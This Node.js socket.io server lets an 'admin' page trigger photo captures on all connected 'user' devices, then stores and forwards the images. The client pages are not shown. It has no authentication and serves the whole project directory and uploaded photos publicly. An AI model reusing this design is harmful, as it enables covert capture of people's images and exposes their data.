const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Folder setup for local storage
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
}

// Serve all files from root and public directories
app.use(express.static(__dirname));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(uploadDir));

// Main Link (Home Page) - Isse aapko dono links screen par hi mil jayenge
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Camera Project Dashboard</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { font-family: Arial, sans-serif; text-align: center; padding: 40px 20px; background: #121212; color: white; }
                h1 { color: #00e676; margin-bottom: 30px; }
                .btn { display: block; width: 80%; max-width: 300px; margin: 15px auto; padding: 15px; background: #2979ff; color: white; text-decoration: none; font-size: 18px; font-weight: bold; border-radius: 8px; }
                .btn-admin { background: #ff1744; }
                p { color: #aaa; margin-top: 20px; }
            </style>
        </head>
        <body>
            <h1>🚀 Camera Project Control</h1>
            <a href="/user.html" class="btn">📱 Open User Page</a>
            <a href="/admin.html" class="btn btn-admin">👑 Open Admin Page</a>
            <p>Dono me se jo page kholna chahein us par click karein.</p>
        </body>
        </html>
    `);
});

// Socket.io connections
io.on('connection', (socket) => {
    console.log('⚡ Connected Device ID:', socket.id);

    socket.on('admin-trigger-capture', () => {
        io.emit('capture-photo');
    });

    socket.on('user-photo-captured', (imageData) => {
        const base64Data = imageData.replace(/^data:image\/png;base64,/, "");
        const fileName = `photo_${Date.now()}.png`;
        const filePath = path.join(uploadDir, fileName);

        fs.writeFile(filePath, base64Data, 'base64', (err) => {
            if (!err) console.log(`✅ Photo Auto-Saved: uploads/${fileName}`);
        });

        io.emit('send-photo-to-admin', imageData);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SERVER RUNNING on port ${PORT}!`);
});